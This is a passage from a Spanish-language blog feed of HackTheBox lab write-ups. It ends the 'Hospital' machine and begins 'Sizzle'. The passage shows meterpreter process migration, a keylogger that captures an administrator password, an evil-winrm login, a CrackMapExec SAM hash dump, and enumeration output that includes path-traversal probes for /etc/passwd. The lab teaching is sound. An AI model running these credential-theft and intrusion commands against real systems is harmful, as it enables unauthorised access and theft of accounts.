 5276  912   WmiPrvSE.
             exe
 5468  656   SMSvcHost
             .exe
 5528  656   vmcompute
             .exe
 5792  656   svchost.e
             xe
 6040  912   ShellExpe  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             rienceHos                 wn              emApps<span class="se">\S</span>hellExp
             t.exe                                     erienceHost_cw5
                                                       n1h2txyewy<span class="se">\S</span>hel
                                                       lExperienceHost
                                                       .exe
 6084  656   msdtc.exe
 6188  6444  explorer.  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\e</span>xpl
             exe                       wn              orer.exe
 6256  3068  IEDriverS  x86   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\U</span>sers<span class="se">\d</span>rbrow
             erver.exe                 wn              n.HOSPITAL<span class="se">\.</span>cac
                                                       he<span class="se">\s</span>elenium<span class="se">\I</span>ED
                                                       riverServer<span class="se">\w</span><span class="k">in
                                                       </span>32<span class="se">\4</span>.14.0<span class="se">\I</span>EDri
                                                       verServer.exe
 6308  7396  conhost.e  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             xe                        wn              em32<span class="se">\c</span>onhost.ex
                                                       e
 6728  1540  taskhostw  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             .exe                      wn              em32<span class="se">\t</span>askhostw.
                                                       exe
 6756  4116  shell.exe  x64   0        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\U</span>sers<span class="se">\d</span>rbrow
                                       wn              n.HOSPITAL<span class="se">\D</span>esk
                                                       top<span class="se">\s</span>hell.exe
 6816  656   svchost.e  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             xe                        wn              em32<span class="se">\s</span>vchost.ex
                                                       e
 6920  6964  ctfmon.ex  x64   1
             e
 6924  912   SearchUI.  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             exe                       wn              emApps<span class="se">\M</span>icrosof
                                                       t.Windows.Corta
                                                       na_cw5n1h2txyew
                                                       y<span class="se">\S</span>earchUI.exe
 6964  656   svchost.e
             xe
 7248  912   RuntimeBr  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             oker.exe                  wn              em32<span class="se">\R</span>untimeBro
                                                       ker.exe
 7264  656   svchost.e
             xe
 7316  912   RuntimeBr  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             oker.exe                  wn              em32<span class="se">\R</span>untimeBro
                                                       ker.exe
 7396  1540  powershel  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             l.exe                     wn              em32<span class="se">\W</span>indowsPow
                                                       erShell<span class="se">\v</span>1.0<span class="se">\p</span>o
                                                       wershell.exe
 7496  656   svchost.e
             xe
 7548  5528  vmwp.exe
 7636  7876  iexplore.  x86   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\P</span>rogram File
             exe                       wn              s <span class="o">(</span>x86<span class="o">)</span><span class="se">\I</span>nterne
                                                       t Explorer<span class="se">\i</span>exp
                                                       lore.exe
 7672  656   svchost.e
             xe
 7824  912   RuntimeBr  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             oker.exe                  wn              em32<span class="se">\R</span>untimeBro
                                                       ker.exe
 7876  6256  iexplore.  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\P</span>rogram File
             exe                       wn              s<span class="se">\i</span>nternet expl
                                                       orer<span class="se">\i</span>explore.e
                                                       xe
 7948  6188  vmtoolsd.  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\P</span>rogram File
             exe                       wn              s<span class="se">\V</span>Mware<span class="se">\V</span>Mware
                                                        Tools<span class="se">\v</span>mtoolsd
                                                       .exe

meterpreter <span class="o">&gt;</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Vemos que el <code class="language-plaintext highlighter-rouge">Dr</code> esta corriendo  <code class="language-plaintext highlighter-rouge">iexplore.exe</code> como la sesión activa es del doctor el es el que esta corriendo el servicio en lo que consiste esta escalada es un hacer un <code class="language-plaintext highlighter-rouge">keylogger</code> para ver lo que hace el <code class="language-plaintext highlighter-rouge">Dr</code> con el proceso.</p>
  </li>
  <li>
    <p>Vamos a migrar al proceso.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> migrate 7824
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Migrating from 3452 to 7824...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Migration completed successfully.
meterpreter <span class="o">&gt;</span>
</code></pre></div></div>

<ul>
  <li>Ahora iniciamos el <code class="language-plaintext highlighter-rouge">keylogger</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> keyscan_start
Starting the keystroke sniffer ...
</code></pre></div></div>

<ul>
  <li>Ahora vamos a esperar unos minutos para ver que información capturamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> keyscan_dump
Dumping captured keystrokes...
administratorTh3B3stH0sp1t4l9786!
</code></pre></div></div>

<ul>
  <li>Y bueno obtenemos credenciales que lo que parece ser son del administrador.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ evil-winrm <span class="nt">-u</span> Administrator <span class="nt">-p</span> <span class="s1">'Th3B3stH0sp1t4l9786!'</span> <span class="nt">-i</span> 10.10.11.241

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>hospital<span class="se">\a</span>dministrator
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="hashes">Hashes</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ cme smb 10.10.11.241 <span class="nt">-u</span> Administrator <span class="nt">-p</span> <span class="s1">'Th3B3stH0sp1t4l9786!'</span> <span class="nt">--sam</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:hospital.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span>+] hospital.htb<span class="se">\A</span>dministrator:Th3B3stH0sp1t4l9786! <span class="o">(</span>Pwn3d!<span class="o">)</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span>+] Dumping SAM hashes
SMB         10.10.11.241    445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:e1ae906d259a980297d5eb72aa7ba35c:::
SMB         10.10.11.241    445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.11.241    445    DC               DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ERROR:root:SAM hashes extraction <span class="k">for </span>user WDAGUtilityAccount failed. The account doesn<span class="s1">'t have hash information.
SMB         10.10.11.241    445    DC               [+] Added 3 SAM hashes to the database
</span></code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Sizzle (insane)</title><link href="http://localhost:4000/hackthebox/machines/insane/2024/05/07/sizzle.html" rel="alternate" type="text/html" title="HackTheBox - Sizzle (insane)" /><published>2024-05-07T00:00:00-06:00</published><updated>2024-05-07T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/insane/2024/05/07/sizzle</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/insane/2024/05/07/sizzle.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/ed709304142fdf369e529d6e843ad62e.png" />
</p>

<ul>
  <li>Sizzle is an Insane difficulty Windows box with an Active Directory environment. A writable directory in an SMB share allows to steal NTLM hashes which can be cracked to access the Certificate Services Portal. A self signed certificate can be created using the CA and used for PSRemoting. A SPN associated with a user allows a kerberoast attack on the box. The user is found to have Replication rights which can be abused to get Administrator hashes via DCSync.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Estos son los puertos abiertos por el protocolo TCP.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap nmap <span class="nt">-sCV</span> 10.10.10.103 <span class="nt">-p21</span>,53,80,135,139,443,445,464,593,3269,9389,49664,49665,49666,49668,49677,49682,49683,49684,49692,49704,49721 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-06 16:49 CST
Nmap scan report <span class="k">for </span>10.10.10.103
Host is up <span class="o">(</span>0.090s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2024-05-06T22:51:09+00:00; -3s from scanner time.
| http-methods:
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
| tls-alpn:
|   h2
|_  http/1.1
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn'</span>t have a title <span class="o">(</span>text/html<span class="o">)</span><span class="nb">.</span>
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: HTB.LOCAL, Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2024-05-06T22:51:10+00:00<span class="p">;</span> <span class="nt">-2s</span> from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49721/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SIZZLE<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: <span class="nt">-2s</span>, deviation: 0s, median: <span class="nt">-3s</span>
| smb2-time:
|   <span class="nb">date</span>: 2024-05-06T22:50:34
|_  start_date: 2024-05-06T22:45:25
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Vamos a ver cual es el nombre del dominio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.10.10.103
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 14393 x64 <span class="o">(</span>name:SIZZLE<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.10.103 sizzle.htb.local htb.local"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.10.103 sizzle.htb.local htb.local
</code></pre></div></div>

<ul>
  <li>El puerto 21 esta abierto podemos conectarnos como el usuario <code class="language-plaintext highlighter-rouge">anonymous</code> pero aun así no encontramos nada interesante dentro.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap ftp 10.10.10.103
Connected to 10.10.10.103.
220 Microsoft FTP Service
Name <span class="o">(</span>10.10.10.103:miguel<span class="o">)</span>: anonymous
331 Anonymous access allowed, send identity <span class="o">(</span>e-mail name<span class="o">)</span> as password.
Password:
230 User logged <span class="k">in</span><span class="nb">.</span>
Remote system <span class="nb">type </span>is Windows_NT.
ftp&gt; <span class="nb">dir
</span>229 Entering Extended Passive Mode <span class="o">(||</span>|63924|<span class="o">)</span>
125 Data connection already open<span class="p">;</span> Transfer starting.
226 Transfer complete.
ftp&gt;
</code></pre></div></div>

<ul>
  <li>Si vemos las tecnologías que esta empleando el servicio web no vemos nada interesante.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.103</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.103</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.103</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">ASP</span><span class="o">.</span><span class="no">NET</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Si vemos la pagina web solo encontramos esto.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/sizzle/1.png" />
</p>

<ul>
  <li>Si hacemos <code class="language-plaintext highlighter-rouge">fuzzing</code> encontramos un directorio interesante sin embargo nos piden credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap dirsearch <span class="nt">-u</span> http://10.10.10.103
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 <span class="o">(</span>_||| _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_|| <span class="o">(</span>_| <span class="o">)</span>

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/miguel/Hackthebox/Sizzle/nmap/reports/http_10.10.10.103/_24-05-06_17-02-22.txt

Target: http://10.10.10.103/

<span class="o">[</span>17:02:22] Starting:
<span class="o">[</span>17:02:24] 403 -  312B  - /%2e%2e//google.com
<span class="o">[</span>17:02:24] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
<span class="o">[</span>17:02:24] 404 -    2KB - /.ashx
<span class="o">[</span>17:02:24] 404 -    2KB - /.asmx
<span class="o">[</span>17:02:41] 403 -  312B  - /<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\e</span>tc<span class="se">\p</span>asswd
<span class="o">[</span>17:02:46] 404 -    2KB - /admin%20/
<span class="o">[</span>17:02:47] 404 -    2KB - /admin.
<span class="o">[</span>17:03:06] 404 -    2KB - /asset..
<span class="o">[</span>17:03:06] 403 -    1KB - /aspnet_client/
<span class="o">[</span>17:03:06] 301 -  157B  - /aspnet_client  -&gt;  http://10.10.10.103/aspnet_client/
<span class="o">[</span>17:03:11] 403 -    1KB - /certenroll/
<span class="o">[</span>17:03:11] 401 -    1KB - /certsrv/
<span class="o">[</span>17:03:11] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
<span class="o">[</span>17:03:20] 400 -    3KB - /docpicker/internal_proxy/https/127.0.0.1:9043/ibm/console
<span class="o">[</span>17:03:31] 301 -  150B  - /images  -&gt;  http://10.10.10.103/images/
<span class="o">[</span>17:03:31] 403 -    1KB - /images/
<span class="o">[</span>17:03:32] 404 -    2KB - /index.php.
<span class="o">[</span>17:03:34] 404 -    2KB - /javax.faces.resource.../
<span class="o">[</span>17:03:34] 400 -    3KB - /jolokia/exec/com.sun.management:type<span class="o">=</span>DiagnosticCommand/help/<span class="k">*</span>
<span class="o">[</span>17:03:34] 400 -    3KB - /jolokia/exec/com.sun.management:type<span class="o">=</span>DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
<span class="o">[</span>17:03:34] 400 -    3KB - /jolokia/exec/com.sun.management:type<span class="o">=</span>DiagnosticCommand/vmLog/disable
<span class="o">[</span>17:03:34] 400 -    3KB - /jolokia/exec/com.sun.management:type<span class="o">=</span>DiagnosticCommand/vmLog/output<span class="o">=!</span>/tmp!/pwned
<span class="o">[</span>17:03:34] 400 -    3KB - /jolokia/exec/java.lang:type<span class="o">=</span>Memory/gc
<span class="o">[</span>17:03:35] 400 -    3KB - /jolokia/exec/com.sun.management:type<span class="o">=</span>DiagnosticCommand/vmSystemProperties
<span class="o">[</span>17:03:34] 400 -    3KB - /jolokia/exec/com.sun.management:type<span class="o">=</span>DiagnosticCommand/jvmtiAgentLoad/!/etc!/passwd
<span class="o">[</span>17:03:34] 400 -    3KB - /jolokia/exec/com.sun.management:type<span class="o">=</span>DiagnosticCommand/jfrStart/filename<span class="o">=!</span>/tmp!/foo
<span class="o">[</span>17:03:35] 400 -    3KB - /jolokia/write/java.lang:type<span class="o">=</span>Memory/Verbose/true
<span class="o">[</span>17:03:35] 400 -    3KB - /jolokia/read/java.lang:type<span class="o">=</span><span class="k">*</span>/HeapMemoryUsage
<span class="o">[</span>17:03:35] 400 -    3KB - /jolokia/search/<span class="k">*</span>:j2eeType<span class="o">=</span>J2EEServer,<span class="k">*</span>
<span class="o">[</span>17:03:35] 400 -    3KB - /jolokia/read/java.lang:type<span class="o">=</span>Memory/HeapMemoryUsage/used
<span class="o">[</span>17:03:38] 404 -    2KB - /login.wdm%2e
<span class="o">[</span>17:03:41] 404 -    2KB - /mcx/mcxservice.svc
<span class="o">[</span>17:03:58] 404 -    2KB - /reach/sip.svc
<span class="o">[</span>17:03:58] 404 -    2KB - /rating_over.
<span class="o">[</span>17:04:04] 404 -    2KB - /service.asmx
<span class="o">[</span>17:04:12] 404 -    2KB - /static..
<span class="o">[</span>17:04:18] 403 -    2KB - /Trace.axd
<span class="o">[</span>17:04:19] 404 -    2KB - /umbraco/webservices/codeEditorSave.asmx
<span class="o">[</span>17:04:25] 404 -    2KB - /WEB-INF./
<span class="o">[</span>17:04:28] 404 -    2KB - /WebResource.axd?d<span class="o">=</span>LER8t9aS
<span class="o">[</span>17:04:28] 404 -    2KB - /webticket/webticketservice.svc

Task Completed
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/sizzle/2.png" />
</p>

<ul>
  <li>Tenemos el puerto <code class="language-plaintext highlighter-rouge">smb</code> abierto a si que podemos listar recursos compartidos empleando un <code class="language-plaintext highlighter-rouge">null session</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.10.10.103 <span class="nt">-u</span> <span class="s1">'miguelito'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span>
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 14393 x64 <span class="o">(</span>name:SIZZLE<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span>+] HTB.LOCAL<span class="se">\m</span>iguelito:
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span>+] Enumerated shares
SMB         10.10.10.103    445    SIZZLE           Share           Permissions     Remark
SMB         10.10.10.103    445    SIZZLE           <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.10.103    445    SIZZLE           ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.10.103    445    SIZZLE           C<span class="nv">$ </span>                             Default share
SMB         10.10.10.103    445    SIZZLE           CertEnroll                      Active Directory Certificate Services share
SMB         10.10.10.103    445    SIZZLE           Department Shares READ
SMB         10.10.10.103    445    SIZZLE           IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.10.10.103    445    SIZZLE           NETLOGON                        Logon server share
SMB         10.10.10.103    445    SIZZLE           Operations
SMB         10.10.10.103    445    SIZZLE           SYSVOL                          Logon server share
</code></pre></div></div>

<ul>
  <li>
    <p>Tenemos permisos de lectura en 2 directorios.</p>
  </li>
  <li>
    <p>Vemos archivos interesantes.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbmap <span class="nt">-H</span> 10.10.10.103 <span class="nt">-u</span> <span class="s1">'miguelito'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">-r</span> <span class="s1">'Department Shares'</span> <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.10.10.103:445	Name: sizzle.htb.local    	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	CertEnroll                                        	NO ACCESS	Active Directory Certificate Services share
	Department Shares                                 	READ ONLY	
	./Department Shares
	dr--r--r--                0 Tue Jul  3 10:22:32 2018	<span class="nb">.</span>
	dr--r--r--                0 Tue Jul  3 10:22:32 2018	..
	dr--r--r--                0 Mon Jul  2 14:21:43 2018	Accounting
	dr--r--r--                0 Mon Jul  2 14:14:28 2018	Audit
	dr--r--r--                0 Tue Jul  3 10:22:39 2018	Banking
	dr--r--r--                0 Mon Jul  2 14:15:01 2018	CEO_protected
	dr--r--r--                0 Mon Jul  2 14:22:06 2018	Devops
	dr--r--r--                0 Mon Jul  2 14:11:57 2018	Finance
	dr--r--r--                0 Mon Jul  2 14:16:11 2018	HR
	dr--r--r--                0 Mon Jul  2 14:14:24 2018	Infosec
	dr--r--r--                0 Mon Jul  2 14:13:59 2018	Infrastructure
	dr--r--r--                0 Mon Jul  2 14:12:04 2018	IT
	dr--r--r--                0 Mon Jul  2 14:12:09 2018	Legal
	dr--r--r--                0 Mon Jul  2 14:15:25 2018	M&amp;A
	dr--r--r--                0 Mon Jul  2 14:14:43 2018	Marketing
	dr--r--r--                0 Mon Jul  2 14:11:47 2018	R&amp;D
	dr--r--r--                0 Mon Jul  2 14:14:37 2018	Sales
	dr--r--r--                0 Mon Jul  2 14:21:46 2018	Security
	dr--r--r--                0 Mon Jul  2 14:16:54 2018	Tax
	dr--r--r--                0 Tue Jul 10 16:39:32 2018	Users
	dr--r--r--                0 Mon Jul  2 14:32:58 2018	ZZ_ARCHIVE
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share
	Operations                                        	NO ACCESS	
	SYSVOL                                            	NO ACCESS	Logon server share
</code></pre></div></div>

<ul>
  <li>
    <p>Nos vamos a conectar con <code class="language-plaintext highlighter-rouge">smbclient</code> para poder descargar e indagar mas.</p>
  </li>
  <li>
    <p>En el directorio <code class="language-plaintext highlighter-rouge">Users</code> encontramos nombres de usuarios del sistema.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap impacket-smbclient htb.local/null@sizzle.htb.local <span class="nt">-no-pass</span>
Impacket v0.11.0 - Copyright 2023 Fortra

Type <span class="nb">help </span><span class="k">for </span>list of commands
<span class="c"># use Department Shares</span>
<span class="c"># ls</span>
drw-rw-rw-          0  Tue Jul  3 10:22:32 2018 <span class="nb">.</span>
drw-rw-rw-          0  Tue Jul  3 10:22:32 2018 ..
drw-rw-rw-          0  Mon Jul  2 14:21:43 2018 Accounting
drw-rw-rw-          0  Mon Jul  2 14:14:28 2018 Audit
drw-rw-rw-          0  Tue Jul  3 10:22:39 2018 Banking
drw-rw-rw-          0  Mon Jul  2 14:15:01 2018 CEO_protected
drw-rw-rw-          0  Mon Jul  2 14:22:06 2018 Devops
drw-rw-rw-          0  Mon Jul  2 14:11:57 2018 Finance
drw-rw-rw-          0  Mon Jul  2 14:16:11 2018 HR
drw-rw-rw-          0  Mon Jul  2 14:14:24 2018 Infosec
drw-rw-rw-          0  Mon Jul  2 14:13:59 2018 Infrastructure
drw-rw-rw-          0  Mon Jul  2 14:12:04 2018 IT
drw-rw-rw-          0  Mon Jul  2 14:12:09 2018 Legal
drw-rw-rw-          0  Mon Jul  2 14:15:25 2018 M&amp;A
drw-rw-rw-          0  Mon Jul  2 14:14:43 2018 Marketing
drw-rw-rw-          0  Mon Jul  2 14:11:47 2018 R&amp;D
drw-rw-rw-          0  Mon Jul  2 14:14:37 2018 Sales
drw-rw-rw-          0  Mon Jul  2 14:21:46 2018 Security
drw-rw-rw-          0  Mon Jul  2 14:16:54 2018 Tax
drw-rw-rw-          0  Tue Jul 10 16:39:32 2018 Users
drw-rw-rw-          0  Mon Jul  2 14:32:58 2018 ZZ_ARCHIVE
<span class="c"># cd Users</span>
<span class="c"># ls</span>
drw-rw-rw-          0  Tue Jul 10 16:39:32 2018 <span class="nb">.</span>
drw-rw-rw-          0  Tue Jul 10 16:39:32 2018 ..
drw-rw-rw-          0  Mon Jul  2 14:18:43 2018 amanda
drw-rw-rw-          0  Mon Jul  2 14:19:06 2018 amanda_adm
drw-rw-rw-          0  Mon Jul  2 14:18:28 2018 bill
drw-rw-rw-          0  Mon Jul  2 14:18:31 2018 bob
drw-rw-rw-          0  Mon Jul  2 14:19:14 2018 chris
drw-rw-rw-          0  Mon Jul  2 14:18:39 2018 henry
drw-rw-rw-          0  Mon Jul  2 14:18:34 2018 joe
drw-rw-rw-          0  Mon Jul  2 14:18:53 2018 jose
drw-rw-rw-          0  Tue Jul 10 16:39:32 2018 lkys37en
drw-rw-rw-          0  Mon Jul  2 14:18:48 2018 morgan
drw-rw-rw-          0  Mon Jul  2 14:19:20 2018 mrb3n
drw-rw-rw-          0  Wed Sep 26 00:45:32 2018 Public
<span class="c">#</span>
</code></pre></div></div>

<ul>
  <li>Si ingresamos al directorio <code class="language-plaintext highlighter-rouge">ZZ_ARCHIVE</code> encontramos archivos con diferentes extensiones.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># cd ZZ_ARCHIVE</span>
<span class="c"># ls</span>
drw-rw-rw-          0  Mon Jul  2 14:32:58 2018 <span class="nb">.</span>
drw-rw-rw-          0  Mon Jul  2 14:32:58 2018 ..
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:58 2018 AddComplete.pptx
<span class="nt">-rw-rw-rw-</span>     419430  Mon Jul  2 14:32:57 2018 AddMerge.ram
